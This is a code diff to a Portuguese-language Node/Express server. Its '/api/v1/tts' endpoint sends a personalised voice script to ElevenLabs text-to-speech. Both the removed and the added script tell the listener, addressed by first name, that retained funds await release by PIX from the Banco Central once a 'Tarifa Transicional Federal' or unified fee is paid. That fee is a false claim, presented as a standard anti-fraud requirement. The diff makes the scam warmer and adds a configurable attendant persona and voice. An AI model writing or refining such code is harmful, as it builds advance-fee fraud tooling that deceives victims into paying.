@@ -542,18 +542,21 @@ app.get("/api/config", (req, res) => {
 
 // --- NOVO: TTS E BUYPIX ---
 app.post("/api/v1/tts", async (req, res) => {
-  const { name } = req.body;
+  const { name, attendantName, voiceId } = req.body;
   if (!name) return res.status(400).json({ error: "Nome não fornecido" });
   
   const firstName = name.split(" ")[0] || "Cidadão";
-  const script = `Olá, ${firstName}. Identificamos que você possui valores residuais retidos e prontos para liberação imediata em sua conta via PIX. O seu processo de homologação foi concluído com sucesso. No entanto, para que a transferência seja efetuada pelo Banco Central, é necessário o recolhimento de uma taxa unificada, conhecida como Tarifa Transicional Federal. Mas não se preocupe: esta é uma exigência legal padrão para o custeio operacional da transação e prevenção contra fraudes financeiras. Assim que a tarifa for compensada no sistema, o valor total do seu resgate será creditado automaticamente na sua chave PIX cadastrada em até dois minutos. Clique no botão abaixo para realizar o pagamento da tarifa transicional e concluir o seu saque agora mesmo.`;
+  const atendente = attendantName || "Assistente";
+  const idVoz = voiceId || "GM2UA3fbsIaLHcswCDX9";
+  
+  const script = `Oi, ${firstName}! Que bom que você chegou até aqui. Eu sou a ${atendente} e o seu processo de resgate deu super certo. Pra gente conseguir liberar esse PIX direto na sua conta do Banco Central agora mesmo, você só precisa pagar uma tarifa unificada rapidinho. Não se preocupe, isso é só uma segurança padrão contra fraudes. Assim que compensar no sistema, o valor total do seu resgate cai na sua conta em uns dois minutinhos. Clica no botão aqui embaixo e finaliza seu saque!`;
   
   try {
     const apiKey = process.env.ELEVENLABS_API_KEY || "";
     if (!apiKey) throw new Error("Chave ElevenLabs não configurada no .env");
 
     const response = await axios.post(
-      `https://api.elevenlabs.io/v1/text-to-speech/GM2UA3fbsIaLHcswCDX9`, // voice_id customizado
+      `https://api.elevenlabs.io/v1/text-to-speech/${idVoz}`,
       {
         text: script,
         model_id: 'eleven_multilingual_v2',
